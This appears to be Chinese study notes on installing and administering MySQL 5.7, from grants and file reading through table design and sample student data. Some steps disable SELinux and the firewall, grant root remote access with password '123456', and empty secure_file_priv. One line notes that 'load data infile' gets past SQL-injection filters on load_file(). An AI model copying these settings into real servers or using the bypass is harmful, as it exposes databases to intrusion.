## mysql

> mysql-5.7.30

### 卸载其他版本的mysql和mariadb

```
rpm -qa |grep mysql
rpm -qa |grep mariadb

mysql-community-common-8.0.28-1.el7.x86_64
mysql-community-server-8.0.28-1.el7.x86_64
mysql-community-libs-8.0.28-1.el7.x86_64
mysql-community-client-8.0.28-1.el7.x86_64
mysql-community-icu-data-files-8.0.28-1.el7.x86_64
mysql-community-client-plugins-8.0.28-1.el7.x86_64
```

```
rpm -e --nodeps mysql-community-common-8.0.28-1.el7.x86_64
rpm -e --nodeps mysql-community-server-8.0.28-1.el7.x86_64
rpm -e --nodeps mysql-community-libs-8.0.28-1.el7.x86_64
rpm -e --nodeps mysql-community-client-8.0.28-1.el7.x86_64
rpm -e --nodeps mysql-community-icu-data-files-8.0.28-1.el7.x86_64
rpm -e --nodeps mysql-community-client-plugins-8.0.28-1.el7.x86_64
```

#### 删除文件

```
cd /var/lib;rm -rf mysql
cd /var/log;rm -rf mysql*
```

### 开始安装

```
cd ~
mkdir mysql/
cd mysql
wget https://downloads.mysql.com/archives/get/p/23/file/mysql-5.7.30-1.el7.x86_64.rpm-bundle.tar
tar xf mysql-5.7.30-1.el7.x86_64.rpm-bundle.tar
```

#### 关闭selinux和防⽕墙

```
getenforce
setenforce 0
 
systemctl status firewalld
systemctl stop firewalld
systemctl disable firewalld
```

#### 按顺序安装

> mysql-community-common-5.7.30-1.el7.x86_64.rpm
>
> mysql-community-libs-compat-5.7.30-1.el7.x86_64.rpm
>
> mysql-community-client-5.7.30-1.el7.x86_64.rpm
>
> mysql-community-server-5.7.30-1.el7.x86_64.rpm

```
rpm -ivh mysql-community-common-5.7.30-1.el7.x86_64.rpm 
rpm -ivh mysql-community-libs-5.7.30-1.el7.x86_64.rpm 
rpm -ivh mysql-community-client-5.7.30-1.el7.x86_64.rpm 
rpm -ivh mysql-community-server-5.7.30-1.el7.x86_64.rpm 
```

### MySQL初始化

**MySQL初始化**并**查看初始化root密码**

##### MySQL初始化

```
mysqld --initialize --user=mysql
```

```
ll /var/lib/mysql
```



##### 查看初始化root密码

```bash
grep password /var/log/mysqld.log
```

`zy5yZjUWli=l`

##### 忘记密码

```bash
systemctl stop mysqld
echo "skip-grant-tables" >> /etc/my.cnf 
systemctl restart mysqld
```



### MySQL数据库启动与登录

#### 启动MySQL

```
systemctl start mysqld

systemctl status mysqld
systemctl enable mysqld 
```

#### 查看MySQL启动进程

```
ps -ef|grep -v grep |grep mysqld
netstat -ntlp |grep mysql
```

#### 登录MySQL

```
mysql -u root -pzy5yZjUWli=l
```

#### 修改密码

`123456`

```
alter user root@localhost identified by '123456';
flush privileges;
```

重启mysqld服务

```
systemctl restart mysqld
```

### MySQL数据库配置⽂件

#### 配置⽂件路径

```
cat /etc/my.cnf
```



```
datadir=/var/lib/mysql            	 #表示数据存放路径
socket=/var/lib/mysql/mysql.sock  	 #表示MySQL进程套接字存放路径      
log-error=/var/log/mysqld.log     	 #表示MySQL错误⽇志存放路径
pid-file=/var/run/mysqld/mysqld.pid  #表示MySQL运⾏进程PID号存放路径
```

#### 修改默认端口

`12345`

光标定位到`[mysqld]`选项下⾯，并添加内容`port=12345`，然后保存退出

```
vim /etc/my.cnf

port=12345
```



```
#重启mysqld服务
systemctl restart mysqld

#查看mysqld进程
ps -ef|grep mysqld

#查看mysqld运⾏端⼝
netstat -lntup | grep mysqld

#登录mysql查看port环境变量
mysql -u root -p123456
show variables like 'port';
```

### 远程连接

#### MySQL的⽤户是否有远程连接的权限

```
#切换数据库
use mysql;

#查看root⽤户的⽤户名和登录主机
select user,host from mysql.user where user='root';
```

##### root@%

###### 修改主机域

```
#修改root⽤户登录主机
update user set host='%' where user='root';

#检查
select user,host from mysql.user where user='root';
```

###### 增加授权

```
grant all privileges on *.* to root@'%' identified by '123456' WITH GRANT OPTION;
flush privileges;
```

##### root@192.168.70.1

```
grant all privileges on *.* to root@'192.168.70.1' identified by '123456';
flush privileges;
select user,host from mysql.user;
```

### MySQL中常⽤命令

#### MySQL中常⽤命令

##### (1)查看MySQL版本号

```
select version();
```

![image-20240717201801590](../../../../repo/assets/image-20240717201801590.png)

#####  (2)查看所有数据库

```
show databases;
```

![image-20240717201845185](../../../../repo/assets/image-20240717201845185.png)

#####  (3)使⽤数据库

```
use mysql;
```

![image-20240717201909360](../../../../repo/assets/image-20240717201909360.png)

#####  (4)查看当前库下所有表

```
show tables;
```

![image-20240717201929003](../../../../repo/assets/image-20240717201929003.png)

#### 获得MySQL元数据命令

##### (1)查看MySQL版本号

```
select version();
```

![image-20240717201951768](../../../../repo/assets/image-20240717201951768.png)



##### (2)查看当前使⽤数据库

```
select database();
```

![image-20240717202009980](../../../../repo/assets/image-20240717202009980.png)

##### (3)查看当前登录⽤户

```
select user();
```

![image-20240717202029959](../../../../repo/assets/image-20240717202029959.png)

##### (4)服务器状态

```
show status\G
```

![image-20240717202503384](../../../../repo/assets/image-20240717202503384.png)

##### (5)查看MySQL变量

```
show variables like 'port';
show variables like 'max_%';
```

![image-20240717202530086](../../../../repo/assets/image-20240717202530086.png)

##### (6)查看数据⽂件存放位置

```
show variables like 'datadir';
```

![image-20240717202553791](../../../../repo/assets/image-20240717202553791.png)

##### (7)查询数据库的数据⽂件路径

```
select @@datadir;
```

![image-20240717202612685](../../../../repo/assets/image-20240717202612685.png)

##### (8)查询MySQL的安装路径

```
select @@basedir;
```

![image-20240717202628880](../../../../repo/assets/image-20240717202628880.png)

#### 快捷命令

##### (1) `\h`

`help`，或`？`查看帮助

```
?         (\?) “帮助”的同义词.
clear     (\c) 清除当前输入语句.
connect   (\r) 重新连接到服务器。可选参数是db和host
delimiter (\d) 设置语句分隔符。
edit      (\e) 使用$EDITOR执行编辑命令。
ego       (\G) 向mysql服务器发送命令，垂直显示结果。
exit      (\q) 退出mysql。 和quit一样。
go        (\g) 向mysql服务器发送命令。
help      (\h) 显示此帮助。
nopager   (\n) 禁用分页器，打印到stdout。
notee     (\t) 不要在outfile中书写。
pager     (\P) 设置pager[to_pager]。通过PAGER打印查询结果。
print     (\p) 打印当前命令。
prompt    (\R) 更改mysql提示符。
quit      (\q) 退出mysql。
rehash    (\#) 重建完成哈希。
source    (\.) 执行SQL脚本文件。将文件名作为参数。
status    (\s) 从服务器获取状态信息。
system    (\!) 执行系统shell命令。
tee       (\T) 设置输出文件[to_outfile]。把所有东西都添加到给定的装备中。
use       (\u) 使用另一个数据库。将数据库名称作为参数。
charset   (\C) 切换到另一个字符集。可能需要处理具有多字节字符集的binlog。
warnings  (\W) 在每条语句后显示警告。
nowarning (\w) 不要在每个语句后显示警告。
resetconnection(\x) 清理会话上下文。
```

![image-20240717202653327](../../../../repo/assets/image-20240717202653327.png)

```
\h create database
```

![image-20240717202717943](../../../../repo/assets/image-20240717202717943.png)

##### (2) `\G`  

格式化，以key：value形式查看数据

```
show status\G
```

![image-20240717202755691](../../../../repo/assets/image-20240717202755691.png)

#####  (3) `\c`  

结束命令，表示不执⾏命令，5.7可以使⽤Ctrl+c

```
show status\c
```

![image-20240717202816540](../../../../repo/assets/image-20240717202816540.png)

##### (4) `\s`  

status，查看状态信息

```
\s
```

![image-20240717202838682](../../../../repo/assets/image-20240717202838682.png)

```
--------------
mysql  Ver 14.14 Distrib 5.7.30, for Linux (x86_64) using  EditLine wrapper

Connection id:		4
Current database:	mysql
Current user:		root@localhost
SSL:			Not in use
Current pager:		stdout
Using outfile:		''
Using delimiter:	;
Server version:		5.7.30 MySQL Community Server (GPL)
Protocol version:	10
Connection:		Localhost via UNIX socket
Server characterset:	latin1
Db     characterset:	latin1
Client characterset:	utf8
Conn.  characterset:	utf8
UNIX socket:		/var/lib/mysql/mysql.sock
Uptime:			1 hour 48 min 15 sec

Threads: 3  Questions: 95  Slow queries: 0  Opens: 209  Flush tables: 1  Open tables: 202  Queries per second avg: 0.014
--------------

```



#####  (5) `\.`  

source，**执⾏外部SQL脚本**，或**导⼊外部SQL数据**

```
#1.在Linux下/tmp⽬录下创建test.sql
touch /tmp/test.sql

#2.在test.sql添加内容
echo "select user,host from mysql.user" >>/tmp/test.sql

#3.在mysql⾥执⾏test.sql脚本
\. /tmp/test.sql
```

![image-20240717203232784](../../../../repo/assets/image-20240717203232784.png)

![image-20240717203302593](../../../../repo/assets/image-20240717203302593.png)

#####  (6) `\u`  

use，切换数据库

```
\u mysql
```

![image-20240717203320328](../../../../repo/assets/image-20240717203320328.png)

#####  (7) `\q`  

exit，或quit，退出登录

```
\q
```

![image-20240717203408106](../../../../repo/assets/image-20240717203408106.png)

#####  (8) `\!` 

 system，执⾏系统命令

```
\! ifconfig
```

![image-20240717203442148](../../../../repo/assets/image-20240717203442148.png)

#### mysqladmin常⽤命令

##### 帮助

```
mysqladmin --help
```

![image-20240717203545922](../../../../repo/assets/image-20240717203545922.png)

```
create databasename	Create a new database
debug			Instruct server to write debug information to log
drop databasename	Delete a database and all its tables
extended-status       Gives an extended status message from the server
flush-hosts           Flush all cached hosts
flush-logs            Flush all logs
flush-status		Clear status variables
flush-tables          Flush all tables
flush-threads         Flush the thread cache
flush-privileges      Reload grant tables (same as reload)
kill id,id,...	Kill mysql threads
password [new-password] Change old password to new-password in current format
ping			Check if mysqld is alive
processlist		Show list of active threads in server
reload		Reload grant tables
refresh		Flush all tables and close and open logfiles
shutdown		Take server down
status		Gives a short status message from the server
start-slave		Start slave
stop-slave		Stop slave
variables             Prints variables available
version		Get version info from server
```

##### (1)查看状态

```
mysqladmin -uroot -p123456 status
```

![image-20240717203617564](../../../../repo/assets/image-20240717203617564.png)

```
Uptime: 7724  Threads: 3  Questions: 117  Slow queries: 0  Opens: 209  Flush tables: 1  Open tables: 202  Queries per second a
```

##### (2)查看mysqld状态

```
mysqladmin -uroot -p123456 ping
```

![image-20240717203651074](../../../../repo/assets/image-20240717203651074.png)

```
mysqld is alive
```

#####  (3)查看变量

```
mysqladmin -uroot -p123456 variables
```

![image-20240717203731679](../../../../repo/assets/image-20240717203731679.png)

##### (4)创建数据库

```
mysqladmin -uroot -p123456 create mytest
```

![image-20240717204002919](../../../../repo/assets/image-20240717204002919.png)

```
mysql -uroot -p123456
show databases;
show create database mytest;
```

![image-20240717203943174](../../../../repo/assets/image-20240717203943174.png)

##### (5)删除数据库

```
mysqladmin -uroot -p123456 drop mytest
```

![image-20240717204041346](../../../../repo/assets/image-20240717204041346.png)

#####  (6)修改密码

```
mysqladmin -uroot -p123456 password 1234567
```

![image-20240717204114572](../../../../repo/assets/image-20240717204114572.png)

##### (7)刷新⽇志

```
mysqladmin -uroot -p123456 flush-log
```

![image-20240717204246406](../../../../repo/assets/image-20240717204246406.png)

```
tailf /var/log/mysqld.log
```

![image-20240717204215424](../../../../repo/assets/image-20240717204215424.png)

##### (8)刷新缓存

```
mysqladmin -uroot -p123456 reload
```

![image-20240717204309264](../../../../repo/assets/image-20240717204309264.png)

###  MySQL⽤户管理

#### ⽤户创建

`create user`创建方式的用户，只有usage使用的权限

`grant` 通过授权的方式创建新用户

```
create user test1@'%' identified by '123';
create user test2@'%' identified by '123';
create user test3@'%' identified by '123';
create user test4@'%' identified by '123';
```

![image-20240718100400250](../../../../repo/assets/image-20240718100400250.png)

#### ⽤户查看

##### (1)查看所有⽤户

```
select user,host from mysql.user;
```

![image-20240718100431018](../../../../repo/assets/image-20240718100431018.png)

##### (2)查看指定⽤户所有信息

```
select * from mysql.user where user='test1'\G
```

![image-20240718100506322](../../../../repo/assets/image-20240718100506322.png)

##### (3)查看⽤户权限赋予情况

```
show grants for test1@'%';
```

```
help show grants
```

![image-20240718100615490](../../../../repo/assets/image-20240718100615490.png)

#### ⽤户授权

MySQL权限存储在mysql库的`user`, `db`, `tables_priv`, `columns_priv`, `procs_priv`这⼏个系统表中，在MySQL实例启 动后就加载到内存中。

`Columns_priv`存储的是**字段**的权限，`procs_priv`存储的是**进程**的权限，`db`就是我们的**数据库** 权限。

```
#授权语句
grant  privileges on databasename.tablename to 'username'@'host' with grant option identified by  'password';

#例如
grant  all privileges on *.* to 'test2'@'%' identified by '123456' with grant option;
```

```
flush privileges;
show grants for test2@'%';
```

![image-20240718102103558](../../../../repo/assets/image-20240718102103558.png)

##### (1)单库授权

```
#创建测试库test，并新建两个表aaa、bbb
create database test;
use test;
create table aaa(cmd text);
create table bbb(cmd text);

#授权语句
grant all privileges on test.* to test3@'%' identified by '123456' with grant option;
```

![image-20240718102339009](../../../../repo/assets/image-20240718102339009.png)

```
desc aaa;
desc bbb;
```

![image-20240718102508200](../../../../repo/assets/image-20240718102508200.png)

```
flush privileges;
show grants for test3@'%';
```

![image-20240718102701530](../../../../repo/assets/image-20240718102701530.png)

##### (2)单表授权

```
grant all privileges on test.aaa to 'test2'@'%' identified by '123' with grant option;
```

```
flush privileges;
show grants for test2@'%';
```

![image-20240718102852393](../../../../repo/assets/image-20240718102852393.png)

##### (3)单字段授权

MySQL**单字段级别的赋权**，这样操作是**连表都是打不开**的，只能通过查询语句，查询⽤户开放的字段。

```
grant select(user) on mysql.user to 'test4'@'%' identified by '123456';
```

```
flush privileges;
show grants for test4@'%';
```

![image-20240718105134671](../../../../repo/assets/image-20240718105134671.png)

```
quit
mysql -u test4 -p123456

select host from mysql.user;
select user from mysql.user;
```

![image-20240718105651384](../../../../repo/assets/image-20240718105651384.png)

#### 收回⽤户权限

```
quit
mysql -u root -p123456
```

```
revoke [权限] ON [库.表] FROM [⽤户名]@[主机];

revoke all privileges on test.aaa from test2@'%';
```

```
flush privileges;
show grants for test2@'%';
```

![image-20240718110243623](../../../../repo/assets/image-20240718110243623.png)

#### ⽤户删除

```
#语句结构，username是要删除的⽤户名，如test1@’%’
drop user [⽤户名];
 
#表示⽤户名为空的删除
drop user ''@'127.0.0.1';
```



```
drop user test3@'%';
delete from mysql.user where user='test2';
```

![image-20240718111113435](../../../../repo/assets/image-20240718111113435.png)

```
use mysql;
select user,host from mysql.user;
```

![image-20240718111148177](../../../../repo/assets/image-20240718111148177.png)

### MySQL数据库读取外部⽂件

#### 读取外部⽂件

##### mysql读取⽂件⽅法

> load_file
>
> load data infile
>
> system cat

 `load_file`和`load data infile`读取⽂件的⽅法为：

新建⼀个表，**表的结构**与**⽂件内的结构**要⼀致，读取⽂件为**字符串形式插⼊表**中，然后**读出表中数据**。

##### 两个前提

- 在拥有file权限的
- `secure_file_priv`不为`NULL`

`secure_file_priv`这个变量的值

```
show variables like 'secure_file_priv';
```

![image-20240718112522878](../../../../repo/assets/image-20240718112522878.png)

如果**为空**的话，就是value⾥⾯什么也没有，那么就表明你**可以读取任何地⽅的⽂ 件**。

但是要注意，在这⾥`NULL`跟**空**时两码事，NULL是NULL值，但是空的话就什么也没有。

如果**为NULL**，则表明 **任何⽂件都⽆法读取**。

#### 读取外部⽂件前提实现

##### (1)修改my.cnf⽂件

```
vim /etc/my.cnf
```

```
[mysqld]
secure_file_priv=
local-infile=1

[mysql]
local-infile=1
```



```
show variables like 'secure_file_priv';
```

![image-20240718143540824](../../../../repo/assets/image-20240718143540824.png)

![image-20240718144649808](../../../../repo/assets/image-20240718144649808.png)

##### (2)关闭selinux

```
setenforce 0
getenforce
```

##### (3)重启mysqld服务

```
systemctl restart mysqld

systemctl status mysqld
ps -ef|grep -v grep|grep mysqld
netstat -ntlp |grep mysqld
```

#### 1、load_file⽅式读取⽂件实现

```mysql
insert into table_name(field) values(load_file('/tmp/1.txt'));
```

##### (1)创建测试⽂件

```bash
cd /tmp
echo "123">1.txt
cat 1.txt
```

![image-20240718143649412](../../../../repo/assets/image-20240718143649412.png)

#####  (2)在mysql中读取⽂件

```mysql
use test;
create table aaa(cmd text);
insert into aaa(cmd) values(load_file('/tmp/1.txt'));
select * from aaa;
```



```mysql
use test;
drop table if exists aaa;
```

```mysql
create table aaa(
    id int auto_increment PRIMARY KEY,
    cmd text 
);

insert into aaa(cmd) values(load_file('/tmp/1.txt'));
select * from aaa;
```

![image-20240718145536183](../../../../repo/assets/image-20240718145536183.png)

#### 2、load data infile⽅式实现⽂件读取

```mysql
load data infile '/tmp/1.txt' into table table_name;
```

其实`load data infile`和`load_file()`⽤法上没有什么区别，

只是在SQL注⼊过程中，往往会过滤掉`load_file()`这个函 数，但是仍然有`load data infile`可以使⽤。

```mysql
use test;
drop table if exists bbb;
create table bbb(
    cmd text
);

load data infile '/tmp/1.txt' into table bbb;
select * from bbb;
```

![image-20240718150829821](../../../../repo/assets/image-20240718150829821.png)

#### 3、system命令⽅式读取⽂件

在mysql版本为`5.x`时,除了可以使⽤上两种⽅法外，还可以使⽤**系统命令**直接读取⽂件。但是要注意，**⽆法越权读取 ⽂件**

```
mysql> system cat /tmp/1.txt
```

![image-20240718151236034](../../../../repo/assets/image-20240718151236034.png)

### MySQL数据库及表实战操作

#### 数据库设计理论

##### 范式理论

> 定义了规范化的三个级别，范式是具有最⼩冗余的表结构。这些范式是：
>
> 第⼀范式(1st NF －First  Normal Formate)
>
> 第⼆范式(2nd NF－Second  Normal Formate)
>
> 第三范式(3rd NF－ Third  Normal Formate)

###### ①第⼀范式 

⽬标是确保每列的原⼦性，如果每列都是**不可再分的最⼩数据单元**（也称为最⼩的原⼦单元），则满⾜第⼀范式 （`1NF`）。

###### ②第⼆范式

如果⼀个关系满⾜1NF，并且**除了主键以外的其他列，都依赖与该主键**，则满⾜第⼆范式（`2NF`），第⼆范式要求 每个表只描述⼀件事情。

###### ③第三范式 

如果⼀个关系满⾜2NF，并且**除了主键以外的其他列都不传递依赖于主键列**，则满⾜第三范式（`3NF`）。

> stu：学号，姓名，性别，年龄，出⽣⽇期，地址，电话，邮箱
>
> course：课程号，课程名
>
> score：学号，课程号，成绩

```mysql
use test;
drop table if exists stu;
drop table if exists course;
drop table if exists score;
create table if not exists stu(
    sid int auto_increment primary key,
    name varchar(10) not null,
    sex varchar(3) not null,
    age int,
    birth varchar(20),
    address varchar(50),
    telephone varchar(11),
    email varchar(20)
);

CREATE TABLE if not exists course (  
    cid int auto_increment primary KEY,
    cname VARCHAR(100) not null  
);

CREATE TABLE if not exists score (  
    sid int,  
    cid int,  
    score int,  
    PRIMARY KEY (sid, cid),  
    FOREIGN KEY (sid) REFERENCES stu(sid),  
    FOREIGN KEY (cid) REFERENCES course(cid)  
);
```

![image-20240718160446769](../../../../repo/assets/image-20240718160446769.png)

#### 建⽴数据库

##### (1)⼤⼩写敏感

MySQL数据库的**⼤⼩写敏感**是通过⼀个环境变量来决定的，

这个环境变量就是`lower_case_file_system`，

如果它的 值为`ON`的话，就是**⼤⼩写不敏感**的，

如果它的值为`OFF`的话，就是**⼤⼩写敏感**。

```
lower_case_file_system = ON      #⼤⼩写不敏感
lower_case_file_system = OFF     #⼤⼩写敏感 
lower_case_table_names = 0       #mysql会根据表名直接操作，⼤⼩写敏感。 
lower_case_table_names = 1       #mysql会先把表名转为⼩写，再执⾏操作。 
```



```
show variables like "lower_case%";
```

![image-20240718160518811](../../../../repo/assets/image-20240718160518811.png)

 Windows系统不区分⼤⼩写，但是Linux系统区分⼤⼩写，所以，当建⽴test数据库和TEST数据时，它们都可以同 时存在。

##### (2)MySQL的注释

###### 单⾏注释

单⾏注释可以⽤"`#`"

```
select 1 as xx; #zheshizhuhsi
```

![image-20240718160701229](../../../../repo/assets/image-20240718160701229.png)

单⾏注释的第⼆种写法⽤ "`--` " 

注意这个⻛格下"**--【空格】**" 也就是说“`--`" 与注释之间是有**空格**的。

```
select 123; -- 这是注释
```

![image-20240718160723749](../../../../repo/assets/image-20240718160723749.png)

###### 多⾏注释

多⾏注释   `/* */`

```
select * from bbb ; /* moimxoamx
xaxac*/
```

![image-20240718161052733](../../../../repo/assets/image-20240718161052733.png)

###### 内联注释

内联注释  `/*！ */`

注释在mysql中叫做**内联注释**，当`！`后⾯所接的**数据库版本号**时，当实际的版本等于或是⾼于那个 字符串，应⽤程序就会将注释内容解释为SQL，否则就会当做注释来处理。默认的，当没有接版本号 时，是会执⾏⾥⾯的内容的。

```
SELECT * FROM bbb /*!50730 union select 1 */;
SELECT * FROM bbb /*! union select 1 */;
```

![image-20240718161237838](../../../../repo/assets/image-20240718161237838.png)

#####  (3)库操作语句

```mysql
-- 建⽴数据库
create database tt    

-- 查看数据库
show create database  tt  

-- 删除数据库
drop database tt

-- 建⽴数据库ddd
create database if not exists ddd
 
-- 修改数据库ddd的字符集
alter database tt default character set 'utf8'
```



```mysql
create database if not exists tt default character set 'utf8';
```

可存表情

```
utf8-mb4
```

![image-20240718162818235](../../../../repo/assets/image-20240718162818235.png)

#### 建⽴数据表

> 我们建⽴以下三个数据表： 
>
> stu：学号，姓名，性别，年龄，出⽣⽇期，地址，电话，邮箱 
>
> course：课程号，课程名 
>
> score：学号，课程号，成绩

```mysql
use tt;
create table if not exists stu(
	sid int(11) unsigned primary key auto_increment,
	name varchar(20) not null,
	sex enum('m', 'f') default 'm',
	age int,
	birth datetime not null default now(),
	addr varchar(50) default '北京',
	tel varchar(11),
	email varchar(50)
);

create table if not exists course(
	cid int(11) unsigned auto_increment primary key,
	cname varchar(20) not null
);

create table if not exists score(
 	sid int(11) unsigned not null,
 	cid int(11) unsigned not null,
 	score int(11) unsigned not null,
 	primary key(sid, cid),
 	foreign key(sid) references stu(sid) on update cascade on delete cascade,
	foreign key(cid) references course(cid) on update cascade on delete cascade
);
```

![image-20240718162905549](../../../../repo/assets/image-20240718162905549.png)

> `primary key`：主键
>
> `foreign key`：外键
>
> `references`：参考
>
> `on update cascade on delete cascade`:同步更新，同步我删除

```mysql
show tables;
desc stu;
desc course;
desc score;
```

![image-20240718162947261](../../../../repo/assets/image-20240718162947261.png)

#### 修改表结构

##### (1)末尾增加字段

```mysql
alter table stu add beizhu varchar(250) comment 'beizhu';
```

```mysql
desc stu;
```

![image-20240718164405237](../../../../repo/assets/image-20240718164405237.png)

#####  (2)开头增加字段

```mysql
alter table stu add xxx varchar(50) first;
```

```
desc stu;
```

![image-20240718164520347](../../../../repo/assets/image-20240718164520347.png)

#####  (3)中间增加字段

```mysql
alter table stu add mr varchar(1) after birth;
```

```mysql
desc stu;
```

![image-20240718164652753](../../../../repo/assets/image-20240718164652753.png)

#####  (4)删除字段

```mysql
alter table stu drop xxx;
alter table stu drop mr;
alter table stu drop beizhu;
```

```mysql
desc stu;
```

![image-20240718164721767](../../../../repo/assets/image-20240718164721767.png)

#####  (5)修改字段

###### ①change修改字段名称

```mysql
alter table stu change tel telephone varchar(11);
```

```mysql
desc stu;
```

![image-20240718164813159](../../../../repo/assets/image-20240718164813159.png)

change是修改字段名称的，但是修改字段的时候，要带上原始的类型，⽐如varchar(11)。

###### ②modify修改字段类型

```mysql
alter table stu modify age int(3);
```

```mysql
desc stu;
```

![image-20240718164850095](../../../../repo/assets/image-20240718164850095.png)

#### 记录增删改

##### (1)增加记录

###### 语句格式

```
insert into 表名(字段1,字段2, ... , 字段n) values(值1,值2, ... , 值n);
```

###### 学⽣表增加记录

```
use tt;
```

```mysql
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (1, '张三', 'f', 12, '2012-10-01 00:00:00', '北京', '1383838438', 'aaa@qq.com');
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (2, '张三1', 'm', 25, '1996-01-01 00:00:00', '上海', '13900002222', 'zhangsan@abc.com');
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (3, '李四', 'm', 27, '1994-01-01 00:00:00', '武汉', '1393342222', 'lisi@def.com');
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (4, '李四2', 'f', 22, '1999-01-01 00:00:00', '杭州', '1393342422', 'lisi@def.com');
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (5, '李四3', 'f', 23, '1998-01-01 00:00:00', '北京', '1393342422', 'lisi@def.com');
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (6, '六六', 'm', 25, '1996-01-01 00:00:00', '天津', '13900002222', 'liuliu@abc.com');
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (7, '贺奇', 'm', 27, '1994-01-01 00:00:00', '北京', '1393342222', 'heqi@def.com');
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (8, '阿珍', 'f', 12, '2012-10-01 00:00:00', '河北', '1383838438', 'azhen@qq.com');
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (9, '⽂⻄', 'm', 25, '1996-01-01 00:00:00', '⽢肃', '13900002222', 'wenxi@abc.com');
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (10, '四眼', 'm', 27, '1994-01-01 00:00:00', '江苏', '1393342222', 'siyan@def.com');
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (11, '冰冰', 'f', 12, '2012-10-01 00:00:00', '湖北', '1383838438', 'bingbing@qq.com');
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (12, '阿⻰', 'm', 25, '1996-01-01 00:00:00', '⼭⻄', '13900002222', 'along@abc.com');
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (13, '诸葛', 'm', 27, '1994-01-01 00:00:00', '河南', '1393342222', 'zhuge@def.com');
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (14, '颜良', 'f', 12, '2012-10-01 00:00:00', '陕⻄', '1383838438', 'yanliang@qq.com');
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (15, '⽂丑', 'm', 25, '1996-01-01 00:00:00', '云南', '13900002222', 'wenchou@abc.com');
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (16, '关⽻', 'm', 27, '1994-01-01 00:00:00', '⼴州', '1393342222', 'guanyu@def.com');
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (17, '张⻜', 'f', 12, '2012-10-01 00:00:00', '⻄藏', '1383838438', 'zhangfei@qq.com');
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (18, '李⼴', 'm', 25, '1996-01-01 00:00:00', '⿊⻰江', '13900002222', 'liguang@abc.com');
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (19, '赵云', 'm', 27, '1994-01-01 00:00:00', '辽宁', '1393342222', 'zhaoyun@def.com');
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (20, '华雄', 'f', 12, '2012-10-01 00:00:00', '吉林', '1383838438', 'huaxiong@qq.com');
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (21, '阿⽃', 'm', 25, '1996-01-01 00:00:00', '浙江', '13900002222', 'adou@abc.com');
INSERT INTO `stu` (`sid`, `name`, `sex`, `age`, `birth`, `addr`, `telephone`, `email`) VALUES (22, '吕布', 'm', 27, '1994-01-01 00:00:00', '福建', '1393342222', 'lvbu@def.com');
```

![image-20240718172919335](../../../../repo/assets/image-20240718172919335.png)

###### 课程表增加记录

```mysql
INSERT INTO `course` (`cid`, `cname`) VALUES (1, '语⽂');
INSERT INTO `course` (`cid`, `cname`) VALUES (2, '数学');
INSERT INTO `course` (`cid`, `cname`) VALUES (3, '英语');
INSERT INTO `course` (`cid`, `cname`) VALUES (4, '物理');
INSERT INTO `course` (`cid`, `cname`) VALUES (5, '化学');
INSERT INTO `course` (`cid`, `cname`) VALUES (6, '政治');
INSERT INTO `course` (`cid`, `cname`) VALUES (7, '渗透测试');
INSERT INTO `course` (`cid`, `cname`) VALUES (8, '⼤数据');
INSERT INTO `course` (`cid`, `cname`) VALUES (9, '计算机原理');
INSERT INTO `course` (`cid`, `cname`) VALUES (10, 'NISP⼆级');
INSERT INTO `course` (`cid`, `cname`) VALUES (11, 'NISP⼀级');
INSERT INTO `course` (`cid`, `cname`) VALUES (12, 'NISP三级');
```

![image-20240718172745612](../../../../repo/assets/image-20240718172745612.png)

###### 成绩表增加记录

```mysql
INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (1, 1, 90);
INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (1, 4, 67);
INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (1, 5, 56);
INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (2, 1, 88);
INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (2, 2, 56);
INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (3, 2, 34);
INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (3, 3, 66);
INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (3, 5, 56);
INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (4, 1, 88);
INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (4, 2, 88);
INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (4, 3, 66);
INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (5, 1, 90);
INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (5, 2, 34);
INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (5, 5, 56);
